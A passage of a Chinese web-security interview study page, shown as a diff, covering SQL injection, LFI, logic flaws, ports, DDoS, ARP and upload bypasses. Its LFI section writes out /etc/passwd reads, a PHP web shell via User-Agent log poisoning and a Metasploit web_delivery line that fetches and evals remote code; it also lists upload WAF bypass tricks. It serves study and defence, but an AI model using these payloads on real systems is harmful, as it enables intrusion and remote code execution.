+<p>gb2312 编码的取值范围。它的高位范围是 0xA1<del>0xF7，低位范围是 0xA1</del>0xFE，而\是 0x5c</p>
+</blockquote>
+<blockquote>
+<p>解决：character_set_client 设置为 binary（二进制)</p>
+</blockquote>
+<h4 id="sqli-中-update-怎么利用">SQLI 中 update 怎么利用</h4>
+<ol>
+<li>left join</li>
+</ol>
+<h4 id="sqli-绕过-waf-思路">SQLI 绕过 WAF 思路</h4>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">1. 大小写混合</span></span>
+<span class="line"><span style="color:#abb2bf">2. 替换关键字 (一次正则)</span></span>
+<span class="line"><span style="color:#abb2bf">3. 使用编码(URL编码/十六进制编码/Unicode编码/)</span></span>
+<span class="line"><span style="color:#abb2bf">4. 使用注释(//, -- , /**/, #, --+,--  -, ;，--a),内联注释/!**/只有MySQL能识别</span></span>
+<span class="line"><span style="color:#abb2bf">5. 等价函数与命令()</span></span>
+<span class="line"><span style="color:#abb2bf">6. 特殊符号 `(+-.可作连接,@定义变量,)</span></span>
+<span class="line"><span style="color:#abb2bf">7. HTTP参数控制(HPP)</span></span>
+<span class="line"><span style="color:#abb2bf">8. 缓冲区溢出</span></span></code></pre>
+<h4 id="mysql-有哪些表有什么用">MySQL 有哪些表，有什么用</h4>
+<blockquote>
+<p>mysql 库</p>
+</blockquote>
+<ol>
+<li>user：</li>
+<li>db：</li>
+<li>table_priv:</li>
+<li>columns_priv:</li>
+</ol>
+<p>user 表身份： Host + User + Password</p>
+<p>权限：user-all &gt; db &gt; tables_priv &gt; columns_priv</p>
+<p>插件 plugin</p>
+<blockquote>
+<p>两个视图库</p>
+</blockquote>
+<ol>
+<li>information_schema</li>
+<li>performance_schema</li>
+</ol>
+<h4 id="sql-注入防御">SQL 注入防御</h4>
+<ol>
+<li>只要是有固定格式的变量，在 SQL 语句执行前，应该严格按照固定格式去检查，确保变量是我们预想的格式</li>
+<li>过滤特殊符号</li>
+<li>绑定变量，使用预编译语句</li>
+</ol>
+<h3 id="lfi">LFI</h3>
+<h4 id="lfi-姿势">LFI 姿势</h4>
+<blockquote>
+<p><a href="http://192.168.1.101/bWAPP/rlfi.php?language=lang_en.php&amp;action=go">http://192.168.1.101/bWAPP/rlfi.php?language=lang_en.php&amp;action=go</a> into 192.168.1.101/bWAPP/flfi.php?language=/etc/passwd</p>
+<p>%00 ?</p>
+<p>4096</p>
+<p><a href="http://192.168.1.101/bWAPP/rlfi.php?language=php://filter/read=convert.base64-encode/resource=/etc/passwd">http://192.168.1.101/bWAPP/rlfi.php?language=php://filter/read=convert.base64-encode/resource=/etc/passwd</a> &gt; <a href="http://192.168.1.101/bWAPP/rlfi.php?language=php://input&amp;cmd=ls">http://192.168.1.101/bWAPP/rlfi.php?language=php://input&amp;cmd=ls</a></p>
+</blockquote>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#56b6c2">&lt;</span><span style="color:#abb2bf">？php system（$ _ GET [</span><span style="color:#98c379">'cmd'</span><span style="color:#abb2bf">]）; ？</span><span style="color:#56b6c2">&gt;</span></span></code></pre>
+<blockquote>
+<p>use exploit/multi/script/web_delivery, 使用 set payload windows/meterpreter/reverse_tcp，php 的 cmd=php -d allow_url_fopen=true -r “eval(file_get_contents(’<a href="http://192.168.0.104:8081/xxxxx">http://192.168.0.104:8081/xxxxx</a>’))“;</p>
+</blockquote>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#56b6c2">&lt;</span><span style="color:#abb2bf">？php system（$ _ GET [</span><span style="color:#98c379">'cmd'</span><span style="color:#abb2bf">]）; ？</span><span style="color:#56b6c2">&gt;</span></span></code></pre>
+<blockquote>
+<p><a href="http://192.168.1.102/dvwa/vulnerabilities/fi/?page=proc/self/environ">http://192.168.1.102/dvwa/vulnerabilities/fi/?page=proc/self/environ</a></p>
+</blockquote>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#61afef">Useragent</span><span style="color:#abb2bf">: </span><span style="color:#56b6c2">&lt;</span><span style="color:#abb2bf">？php system（$ _ GET [</span><span style="color:#98c379">'cmd'</span><span style="color:#abb2bf">]）; ？</span><span style="color:#56b6c2">&gt;</span></span></code></pre>
+<blockquote>
+<p>然后访问 192.168.1.8/lfi/lfi.php?file=/var/www/apachae2/access.log&amp;cmd=id</p>
+</blockquote>
+<h3 id="指纹">指纹</h3>
+<h4 id="web-指纹有哪些">Web 指纹有哪些</h4>
+<ol>
+<li>API：Wappalyzer API</li>
+<li>页面关键字 Powered by</li>
+<li>特殊文件名/文件 hash/robots</li>
+<li>文件标签结构</li>
+<li>response</li>
+</ol>
+<h4 id="如何获取大量指纹信息">如何获取大量指纹信息</h4>
+<ol>
+<li>开源 API</li>
+<li>爬虫</li>
+</ol>
+<h4 id="指纹擦除">指纹擦除</h4>
+<ol>
+<li>burp : Proxy——&gt;Options”中的“Match and Replace</li>
+</ol>
+<h4 id="工具扫描器具有的指纹信息">工具扫描器具有的指纹信息</h4>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">Acunetix Web Vulnerability Scanner：</span></span>
+<span class="line"><span style="color:#abb2bf">        http headers:</span></span>
+<span class="line"><span style="color:#abb2bf">            Acunetix</span><span style="color:#56b6c2">-</span><span style="color:#abb2bf">Aspect</span></span>
+<span class="line"><span style="color:#abb2bf">            Acunetix</span><span style="color:#56b6c2">-</span><span style="color:#abb2bf">Aspect</span><span style="color:#56b6c2">-</span><span style="color:#abb2bf">Password</span></span>
+<span class="line"><span style="color:#abb2bf">            Acunetix</span><span style="color:#56b6c2">-</span><span style="color:#abb2bf">Aspect</span><span style="color:#56b6c2">-</span><span style="color:#abb2bf">Queries</span></span>
+<span class="line"><span style="color:#abb2bf">        params:</span></span>
+<span class="line"><span style="color:#abb2bf">            acunetix_wvs_security_test</span></span>
+<span class="line"><span style="color:#abb2bf">        url:</span></span>
+<span class="line"><span style="color:#abb2bf">            </span><span style="color:#56b6c2">/</span><span style="color:#abb2bf">acunetix</span><span style="color:#56b6c2">-</span><span style="color:#abb2bf">wvs</span><span style="color:#56b6c2">-</span><span style="color:#abb2bf">test</span><span style="color:#56b6c2">-</span><span style="color:#c678dd;font-style:italic">for</span><span style="color:#56b6c2">-</span><span style="color:#abb2bf">some</span><span style="color:#56b6c2">-</span><span style="color:#abb2bf">inexistent</span><span style="color:#56b6c2">-</span><span style="color:#e06c75">file</span></span>
+<span class="line"><span style="color:#abb2bf">        cookie params:</span></span>
+<span class="line"><span style="color:#abb2bf">            acunetixCookie</span></span>
+<span class="line"><span style="color:#abb2bf">    </span><span style="color:#d19a66">HP</span><span style="color:#abb2bf"> WebInspect:</span></span>
+<span class="line"><span style="color:#abb2bf">        http headers:</span></span>
+<span class="line"><span style="color:#abb2bf">            X</span><span style="color:#56b6c2">-</span><span style="color:#d19a66">WIPP</span></span>
+<span class="line"><span style="color:#abb2bf">            X</span><span style="color:#56b6c2">-</span><span style="color:#abb2bf">RequestManager</span><span style="color:#56b6c2">-</span><span style="color:#abb2bf">Memo</span></span>
+<span class="line"><span style="color:#abb2bf">            X</span><span style="color:#56b6c2">-</span><span style="color:#abb2bf">Request</span><span style="color:#56b6c2">-</span><span style="color:#abb2bf">Memo</span></span>
+<span class="line"><span style="color:#abb2bf">            X</span><span style="color:#56b6c2">-</span><span style="color:#abb2bf">Scan</span><span style="color:#56b6c2">-</span><span style="color:#abb2bf">Memo</span></span>
+<span class="line"><span style="color:#abb2bf">        cookie params:</span></span>
+<span class="line"><span style="color:#abb2bf">            CustomCookie</span></span>
+<span class="line"><span style="color:#abb2bf">    Netsparker:</span></span>
+<span class="line"><span style="color:#abb2bf">        params:</span></span>
+<span class="line"><span style="color:#abb2bf">            netsparker</span></span></code></pre>
+<h3 id="逻辑漏洞">逻辑漏洞</h3>
+<h4 id="测试一般流程">测试一般流程</h4>
+<ol>
+<li>首先尝试正常密码找回流程，选择不同找回方式，记录所有数据包</li>
+<li>分析数据包，找到敏感部分</li>
+<li>分析后台找回机制所采用的验证手段</li>
+<li>修改数据包验证推测</li>
+</ol>
+<h4 id="身份认证">身份认证</h4>
+<ol>
+<li>暴力破解/弱加密/固定 phpsessid/可破解 cookie</li>
+</ol>
+<h4 id="业务一致性">业务一致性</h4>
+<ol>
+<li>手机号/id/邮箱/订单号篡改</li>
+</ol>
+<h4 id="业务数据篡改">业务数据篡改</h4>
+<ol>
+<li>金额/商品数量/数量限制/js 修改</li>
+</ol>
+<h4 id="业务授权">业务授权</h4>
+<ol>
+<li>未授权访问/越权访问</li>
+</ol>
+<h4 id="用户凭证暴力破解">用户凭证暴力破解</h4>
+<ol>
+<li>纯数字验证(4/6 位)不失效和限制次数</li>
+</ol>
+<h4 id="返回凭证">返回凭证</h4>
+<ol>
+<li>url 返回验证码及 token</li>
+</ol>
+<h4 id="密码找回凭证在页面中">密码找回凭证在页面中</h4>
+<h4 id="返回短信验证码">返回短信验证码</h4>
+<h4 id="邮箱弱-token">邮箱弱 token</h4>
+<ol>
+<li>时间戳 md5</li>
+</ol>
+<h4 id="用户名--服务器时间">用户名 &amp; 服务器时间</h4>
+<ol>
+<li>在重置密码链接改用户名</li>
+</ol>
+<h4 id="用户凭证有效性">用户凭证有效性</h4>
+<ol>
+<li>验证码和手机号未关联</li>
+<li>邮件中的 username 未验证</li>
+<li>步骤缺乏中间验证</li>
+</ol>
+<h4 id="邮箱-token">邮箱 token</h4>
+<ol>
+<li>没起关联作用</li>
+</ol>
+<h4 id="重置密码-token">重置密码 token</h4>
+<ol>
+<li>token 绑定问题</li>
+</ol>
+<h4 id="重新绑定">重新绑定</h4>
+<ol>
+<li>越权绑定手机号</li>
+</ol>
+<h4 id="邮箱绑定">邮箱绑定</h4>
+<ol>
+<li>更改找回密码页面 uid 导致此 id 被自己的忘记密码机制修改</li>
+</ol>
+<h4 id="服务器验证">服务器验证</h4>
+<ol>
+<li>最终提交时客户端确定了 uid</li>
+</ol>
+<h4 id="服务器验证可控内容">服务器验证可控内容</h4>
+<ol>
+<li>cookie 内的 id</li>
+<li>网页返回了密文</li>
+</ol>
+<h4 id="服务器验证验证逻辑为空">服务器验证验证逻辑为空</h4>
+<ol>
+<li>验证信息永真</li>
+</ol>
+<h4 id="用户身份验证">用户身份验证</h4>
+<ol>
+<li>验证码和手机号没绑定</li>
+</ol>
+<h4 id="账号与邮箱账号的绑定">账号与邮箱账号的绑定</h4>
+<ol>
+<li>重新发送邮件未做绑定验证</li>
+</ol>
+<h4 id="找回步骤">找回步骤</h4>
+<ol>
+<li>跳过验证步骤、找回方式，直接到设置新密码页面</li>
+</ol>
+<h4 id="本地验证">本地验证</h4>
+<ol>
+<li>在本地验证服务器的返回信息，确定是否执行重置密码，但是其返回信息是可控的内容，或者可以得到的内容</li>
+</ol>
+<h4 id="发送短信等验证信息的动作在本地进行可以通过修改返回包进行控制">发送短信等验证信息的动作在本地进行，可以通过修改返回包进行控制</h4>
+<h4 id="注入">注入</h4>
+<ol>
+<li>username</li>
+</ol>
+<h4 id="token-生成">Token 生成</h4>
+<ol>
+<li>找回密码 token 被其他人使用</li>
+</ol>
+<h4 id="注册覆盖">注册覆盖</h4>
+<h4 id="session-覆盖">session 覆盖</h4>
+<ol>
+<li>第一个找回密码链接可以覆盖同浏览器第二个找回密码请求</li>
+</ol>
+<h3 id="html5">HTML5</h3>
+<h4 id="html5-安全">HTML5 安全</h4>
+<ol>
+<li><code>&lt;iframe sandbox&gt;</code> 独立同源策略: 不允许脚本执行、表单提交、插件加载、访问其他浏览对象</li>
+<li><code>&lt;video onloadedmetdata='' ondurationchanged='' ontimeupdate=''&gt; &lt;/video&gt;</code></li>
+<li><code>&lt;a rel='noreferrer'&gt;</code> 同样还有<code>&lt;area&gt;</code></li>
+<li>HTTP Headers: Origin</li>
+<li>postMessage(绕过 sandbox)</li>
+<li>Web Storage(存 xss payload)</li>
+</ol>
+<h4 id="html5-的新安全策略">HTML5 的新安全策略</h4>
+<h3 id="扫描器">扫描器</h3>
+<h4 id="扫描器扫不出来的漏洞">扫描器扫不出来的漏洞</h4>
+<ol>
+<li>逻辑漏洞等需要人为参与的</li>
+<li>无法绕过的验证措施</li>
+</ol>
+<h4 id="xssfuzzing">xssFuzzing</h4>
+<h4 id="如何做扫描器">如何做扫描器</h4>
+<h4 id="创宇wooyun-等扫描器的原理为什么这么设计">创宇、wooyun 等扫描器的原理，为什么这么设计</h4>
+<h3 id="整体思路">整体思路</h3>
+<h4 id="企业安全应急响应中如何获取-app-指纹">企业安全应急响应中，如何获取 APP 指纹</h4>
+<h4 id="如何日掉一个网站思路">如何日掉一个网站，思路</h4>
+<h4 id="如何进行代码审计">如何进行代码审计</h4>
+<h4 id="只有后台如何渗透">只有后台如何渗透</h4>
+<h4 id="如何社工一个企业的员工信息">如何社工一个企业的员工信息</h4>
+<h4 id="如何获得一个域名的邮箱列表">如何获得一个域名的邮箱列表</h4>
+<h4 id="webserver-最重要的是什么流程">WebServer 最重要的是什么/流程</h4>
+<h4 id="企业安全">企业安全</h4>
+<h4 id="追踪溯源">追踪溯源</h4>
+<h4 id="给写-php-的人安全建议">给写 PHP 的人安全建议</h4>
+<ol>
+<li>不要反序列化任何用户数据</li>
+<li>不要使用==</li>
+<li>display_error = Off</li>
+</ol>
+<h4 id="php-安全建议">PHP 安全建议</h4>
+<ol>
+<li>绝不要信任外部数据或输入</li>
+<li>用户输入进行清理的一个简单方法是，使用正则表达式来处理它(规则长度)</li>
+<li>禁用那些使安全性难以实施的 PHP 设置: register_globals</li>
+<li>如果不能理解它, 就不能保护它</li>
+<li>使用预编译(php 5.3.6 以前版本中，并不支持 DSN 中的 charset 选项，所有绑定的变量均是以 ascii 字节进行转义的)，使用 mysql_real_escape_string()(5.5)</li>
+<li>使用 is_numeric()</li>
+<li>检查用户输入长度</li>
+<li>防止十六进制字符串</li>
+<li>从用户输入中清除 HTML 标记</li>
+<li>token、验证码</li>
+<li>使用 filter_var 和 filter_input 等过滤器</li>
+<li>打开/etc/php.ini 文件, 查找到 disable_functions, 添加需禁用的函数名, 如下:
+phpinfo,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status</li>
+<li>数据库子集 utf8mb4</li>
+</ol>
+<h4 id="如何知道-waf-信息">如何知道 WAF 信息</h4>
+<ol>
+<li>Cookie 值</li>
+<li>HTTP 响应头</li>
+<li>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">               HTML特殊字符串</span></span></code></pre>
+</li>
+<li>特定 src 引用</li>
+<li>404/200 页</li>
+</ol>
+<h4 id="如何收集子域名">如何收集子域名</h4>
+<ol>
+<li>枚举，A 记录对比</li>
+<li>DNS 查询</li>
+<li>循环爆破</li>
+<li>前缀后缀处理</li>
+<li>SSL 证书</li>
+<li>网站爬虫</li>
+<li>域传送漏洞</li>
+<li>搜索引擎</li>
+<li>crossdomain.xml</li>
+<li>IP 反查</li>
+</ol>
+<blockquote>
+<p>防御</p>
+</blockquote>
+<ol>
+<li>泛解析？</li>
+</ol>
+<h3 id="协议">协议</h3>
+<h4 id="同源策略为什么有它">同源策略，为什么有它</h4>
+<ol>
+<li>同协议端口域名</li>
+<li>保护当前网站资源和数据</li>
+</ol>
+<h4 id="websocket">WebSocket</h4>
+<h4 id="dns-协议在哪一层什么时候用-tcp">DNS 协议在哪一层，什么时候用 TCP</h4>
+<ol>
+<li>应用层</li>
+<li>区域传送 TCP、UDP 最长 512 字节,使用 TCP、同步(大量数据)</li>
+</ol>
+<h4 id="网络协议脆弱性">网络协议脆弱性</h4>
+<p><a href="http://kjgcdx.ijournal.cn/ch/reader/create_pdf.aspx?file_no=20020414&amp;year_id=2002&amp;quarter_id=4&amp;falg=1">PDF</a></p>
+<blockquote>
+<p>TCP/IP</p>
+</blockquote>
+<ol>
+<li>不能提供可靠的身份验证(三次握手提供可靠连接)</li>
+<li>不能有效防止信息泄漏(窃听)</li>
+<li>没有提供可靠的信息完整性验证手段(算法不够完整)</li>
+<li>协议没有手段控制资源占用和分配(SYN flood、DoS)</li>
+</ol>
+<blockquote>
+<p>TCP/IP</p>
+</blockquote>
+<ol>
+<li>IP 欺骗(攻击者首先要便被假冒的主机对目标主机发来的数据包不做响应,SYN),猜测序列号</li>
+<li>TCP 会话劫持(认证后猜测序列号)</li>
+<li>拒绝服务(SYN Flood)</li>
+<li>ping 溢出</li>
+<li>RST/FIN</li>
+</ol>
+<h4 id="tcpudp-区别-如何做可靠性连接-为什么">TCP/UDP 区别 如何做可靠性连接 为什么</h4>
+<ol>
+<li>
+<p>TCP 慢、可靠、面向连接、大量数据传送，UDP 反之</p>
+</li>
+<li>
+<p>确认和重传：接收方收到报文就会确认，发送方发送一段时间后没有收到确认就重传。</p>
+</li>
+<li>
+<p>数据校验</p>
+</li>
+<li>
+<p>数据合理分片和排序：</p>
+<p>UDP：IP 数据报大于 1500 字节,大于 MTU.这个时候发送方 IP 层就需要分片(fragmentation).把数据报分成若干片,使每一片都小于 MTU.而接收方 IP 层则需要进行数据报的重组.这样就会多做许多事情,而更严重的是,由于 UDP 的特性,当某一片数据传送中丢失时,接收方便无法重组数据报.将导致丢弃整个 UDP 数据报.</p>
+<p>tcp 会按 MTU 合理分片，接收方会缓存未按序到达的数据，重新排序后再交给应用层。</p>
+</li>
+</ol>
+<p>4、流量控制：当接收方来不及处理发送方的数据，能提示发送方降低发送的速率，防止包丢失。</p>
+<p>5、拥塞控制：当网络拥塞时，减少数据的发送。</p>
+<p><img alt="" decoding="async" loading="lazy" src="http://ac-HSNl7zbI.clouddn.com/gKeaXY7TS7XekKwjkhA67DzAznD88lkSgNBmPG7Q.jpg"></p>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">信道不可靠, 但是通信双方需要就某个问题达成一致, 而要解决这个问题, 无论你在消息中包含什么信息, 三次通信是理论上的最小值, 所以三次握手不是TCP本身的要求, 而是为了满足"在不可靠信道上可靠地传输信息"这一需求所导致的.请注意这里的本质需求, 信道不可靠, 数据传输要可靠</span></span></code></pre>
+<h3 id="端口">端口</h3>
+<h4 id="常见端口">常见端口</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Port</th><th>Server</th><th>Port</th><th>Server</th><th>Port</th><th>Server</th></tr></thead><tbody><tr><td>21</td><td>FTP</td><td>22</td><td>SSH</td><td>23</td><td>Telnet</td></tr><tr><td>80</td><td>web</td><td>80-89</td><td>web</td><td>161</td><td>SNMP</td></tr><tr><td>389</td><td>LDAP</td><td>443</td><td>SSL</td><td>445</td><td>SMB</td></tr><tr><td>512,513,514</td><td>Rexec</td><td>873</td><td>Rsync 未授权</td><td>1025,111</td><td>NFS</td></tr><tr><td>1433</td><td>MSSQL</td><td>1521</td><td>Oracle:iSqlPlus Oracle:Port:5560,7778</td><td>2082/2083</td><td>cpanel 主机管理系统登陆 （国外用较多）</td></tr><tr><td>2222</td><td>DA 虚拟主机管理系统登陆 （国外用较多）</td><td>2601,2604</td><td>zebra 路由，默认密码 zebra</td><td>3128</td><td>squid 代理默认端口，如果没设置口令很可能就直接漫游内网了</td></tr><tr><td>3306</td><td>MySQL</td><td>3312/3311</td><td>kangle 主机管理系统登陆</td><td>3389</td><td>远程桌面</td></tr><tr><td>4440</td><td>rundeck</td><td>5432</td><td>PostgreSQL</td><td>5900</td><td>vnc</td></tr><tr><td>5984</td><td>CouchDB <a href="http://xxx:5984/%5C_utils/">http://xxx:5984/\_utils/</a></td><td>6082</td><td>varnish</td><td>6379</td><td>redis 未授权</td></tr><tr><td>7001,7002</td><td>WebLogic 默认弱口令，反序列</td><td>7778</td><td>Kloxo 主机控制面板登录</td><td>8000-9090</td><td>都是一些常见的 web 端口，有些运维喜欢把管理后台开在这些非 80 的端口上</td></tr><tr><td>8080</td><td>tomcat/WDCP 主机管理系统，默认弱口令</td><td>8080,8089,9090</td><td>JBOSS</td><td>8083</td><td>Vestacp 主机管理系统 （国外用较多）</td></tr><tr><td>8649</td><td>ganglia</td><td>8888</td><td>amh/LuManager 主机管理系统默认端口</td><td>9200,9300</td><td>elasticsearch</td></tr><tr><td>10000</td><td>Virtualmin/Webmin 服务器虚拟主机管理系统</td><td>11211</td><td>memcache 未授权访问</td><td>27017,27018</td><td>Mongodb 未授权访问</td></tr><tr><td>28017</td><td>mongodb 统计页面</td><td>50000</td><td>SAP 命令执行</td><td>50070,50030</td><td>hadoop 默认端口未授权访问</td></tr></tbody></table>
+<h3 id="版本差异">版本差异</h3>
+<h4 id="mysql45-的区别">MySQL4,5 的区别</h4>
+<ol>
+<li>information_schema(&gt;=5.0)</li>
+<li>多用户操作(&gt;=5.0)</li>
+</ol>
+<h4 id="php57-区别">PHP5,7 区别</h4>
+<ol>
+<li>移除一些旧的扩展，被移迁移到了 PECL（例如：mysql）</li>
+<li>移除 SAPIs 的支持</li>
+<li>
+
+</li>
+<li>16 进制的字符串转换被废除了</li>
+<li>HTTP_RAW_POST_DATA 移除了（可以使用 php://input 替代）</li>
+<li>静态函数里面不再支持通过一个不兼容的$this 调用一个非静态的函数了 $o = &amp; new className{}，不再支持这样的写法</li>
+<li>php.ini 文件移除了#作为注释，统一用;去注释</li>
+</ol>
+<h3 id="ddos">DDoS</h3>
+<h4 id="ddos-原理-反射原理tcp-可以反射攻击吗">DDoS 原理, 反射原理，TCP 可以反射攻击吗</h4>
+<blockquote>
+<p>三种类型</p>
+</blockquote>
+<ol>
+<li>个人组建僵尸网络发动 DDoS</li>
+<li>利用开放服务器（DNS、NTP、简单网管协议 SNMP）脆弱性进行反射攻击</li>
+<li>智能/IoT 设备协议（简单服务发现协议 SSDP，30 倍）脆弱性进行反射攻击</li>
+</ol>
+<h4 id="ddos-防御策略">DDoS 防御策略</h4>
+<ol>
+<li>源验证／反向探测，对源进行探测和人机识别，段包括 cookie、识别码等；</li>
+<li>限源，即对源 IP 或协议进行限制，黑名单是一个常见手段；</li>
+<li>特征丢弃，依据数据包的特征或访问行为进行丢弃，如基于 Payload 特征、发包行为特征、QPS 特征等；</li>
+<li>限速，对流量／访问的速率进行限流。</li>
+</ol>
+<h4 id="大网站子站的安全性如何保证">大网站子站的安全性如何保证</h4>
+<h3 id="arp-攻击">ARP 攻击</h3>
+<h4 id="原理-3">原理</h4>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">ARP请求用于询问某IP地址的物理地址(MAC)，只有被询问主机回复，收到后会保留在两机一段时间。</span></span>
+<span class="line"><span style="color:#abb2bf">欺骗至少要满足：被信任协议ARP，pc会向所有人广播ARP询问信息X， 并且hacker的信息优先X到达。</span></span>
+<span class="line"><span style="color:#abb2bf">攻击：向网络发送大量伪造的IP和MAC地址，占用带宽;并且由于重复发送大量虚假重复信息，虚假信息会导致被攻击主机网络受限或数据包截获。</span></span></code></pre>
+<h4 id="arp-为什么能这样做">ARP 为什么能这样做</h4>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">ARP是信任协议，ARP设计决定</span></span></code></pre>
+<h4 id="arp-如何防范">ARP 如何防范</h4>
+<ul>
+<li>静态绑定网关 IP-MAC</li>
+<li>ARP 防火墙</li>
+<li>VLAN 和交换机端口绑定（VLAN 划分减少影响；学习地址后再绑定）</li>
+<li>动态 ARP 检查</li>
+<li>DAI（DHCP Snooping 绑定表+ARP access-list）</li>
+<li>IPV6（保存签名，拥有权可验证）</li>
+</ul>
+<h3 id="上传">上传</h3>
+<h4 id="上传绕过-waf">上传绕过 WAF</h4>
+<ol>
+<li>filename 在 content-type 下面</li>
+<li>.asp{80-90}</li>
+<li>NTFS ADS</li>
+<li>.asp…</li>
+<li>boundary 不一致</li>
+<li>iis6 分号截断 asp.asp;asp.jpg</li>
+<li>apache 解析漏洞 php.php.ddd</li>
+<li>boundary 和 content-disposition 中间插入换行</li>
+<li>hello.php:a.jpg 然后 hello.&lt;&lt;&lt;</li>
+<li>filename=php.php</li>
+<li>filename=“a.txt”;filename=“a.php”</li>
+<li>name=\n”file”;filename=“a.php”</li>
+<li>content-disposition:\n</li>
+<li>.htaccess 文件</li>
+<li>a.jpg.\nphp</li>
+<li>去掉 content-disposition 的 form-data 字段</li>
+<li>php&lt;5.3 单双引号截断特性</li>
+<li>删掉 content-disposition: form-data;</li>
+<li>content-disposition\00:</li>
+<li>{char}+content-disposition</li>
+<li>head 头的 content-type: tab</li>
+<li>head 头的 content-type: multipart/form-DATA</li>
+<li>filename 后缀改为大写</li>
+<li>head 头的 Content-Type: multipart/form-data;\n</li>
+<li>.asp 空格</li>
+<li>.asp0x00.jpg 截断</li>
+<li>双 boundary</li>
+<li>file\nname=“php.php”</li>
+<li>head 头 content-type 空格:</li>
+<li>form-data 字段与 name 字段交换位置</li>
+</ol>
+<h3 id="常见漏洞编号">常见漏洞编号</h3>
+<ol>
+<li>S2-045 Jakarta Multipart 解析器 远程命令执行</li>
+<li>S2-016 参数 action 的值 redirect 以及 redirectAction 没有正确过滤，导致 ognl 代码执行</li>
+<li>S2-032 用户开启动态方法调用的情况下(method 没有过滤)，会被攻击者实现远程代码执行攻击</li>
+</ol>
+<h3 id="参考">参考</h3>
+<ol>
+<li>wooyun drops</li>
+<li><a href="http://www.thinkings.org/2017/02/13/my-waf-bypass-series-article.html">http://www.thinkings.org/2017/02/13/my-waf-bypass-series-article.html</a></li>
+<li><a href="http://www.blbana.cc/2016/10/16/266/">http://www.blbana.cc/2016/10/16/266/</a></li>
+<li><a href="http://blog.csdn.net/whuslei/article/details/6667471">http://blog.csdn.net/whuslei/article/details/6667471</a></li>
+<li><a href="https://www.zhihu.com/question/24853633">https://www.zhihu.com/question/24853633</a></li>
+<li><a href="http://jzking121.blog.51cto.com/5436671/1835921">http://jzking121.blog.51cto.com/5436671/1835921</a></li>
+<li>遗漏和错误请私戳</li>
+</ol>
+    </article>
+
+    <ul class="astro-VJ4TPSPI tags-container">
+      <li class="astro-BLWJYJPT inline-block my-1 underline-offset-4">
+  <a href="/tags/interview" class="astro-BLWJYJPT group pr-2 text-sm">
+    <svg class="astro-BLWJYJPT scale-75" xmlns="http://www.w3.org/2000/svg"><path d="M16.018 3.815 15.232 8h-4.966l.716-3.815-1.964-.37L8.232 8H4v2h3.857l-.751 4H3v2h3.731l-.714 3.805 1.965.369L8.766 16h4.966l-.714 3.805 1.965.369.783-4.174H20v-2h-3.859l.751-4H21V8h-3.733l.716-3.815-1.965-.37zM14.106 14H9.141l.751-4h4.966l-.752 4z" class="astro-BLWJYJPT"></path>
+    </svg>
+    &nbsp;<span class="astro-BLWJYJPT">interview</span>
+  </a>
+</li><li class="astro-BLWJYJPT inline-block my-1 underline-offset-4">
+  <a href="/tags/security" class="astro-BLWJYJPT group pr-2 text-sm">
+    <svg class="astro-BLWJYJPT scale-75" xmlns="http://www.w3.org/2000/svg"><path d="M16.018 3.815 15.232 8h-4.966l.716-3.815-1.964-.37L8.232 8H4v2h3.857l-.751 4H3v2h3.731l-.714 3.805 1.965.369L8.766 16h4.966l-.714 3.805 1.965.369.783-4.174H20v-2h-3.859l.751-4H21V8h-3.733l.716-3.815-1.965-.37zM14.106 14H9.141l.751-4h4.966l-.752 4z" class="astro-BLWJYJPT"></path>
+    </svg>
+    &nbsp;<span class="astro-BLWJYJPT">security</span>
+  </a>
+</li>
+    </ul>
+  </main>
+  <footer class="astro-SZ7XMLTE mt-auto">
+  <div class="max-w-3xl mx-auto px-0">
+  <hr aria-hidden="true" class="border-skin-line">
+</div>
+  <div class="astro-SZ7XMLTE footer-wrapper">
+    <div class="flex astro-UPU6FZXR social-icons">
+  <a href="https://github.com/lc4t" class="inline-block astro-5EUNQZKT group astro-UPU6FZXR link-button" tabindex="0" title=" 鱼の on Github">
+  
+        <svg class="icon-tabler" xmlns="http://www.w3.org/2000/svg" stroke-linecap="round" stroke-linejoin="round">
+    <path d="M0 0h24v24H0z" fill="none" stroke="none"></path>
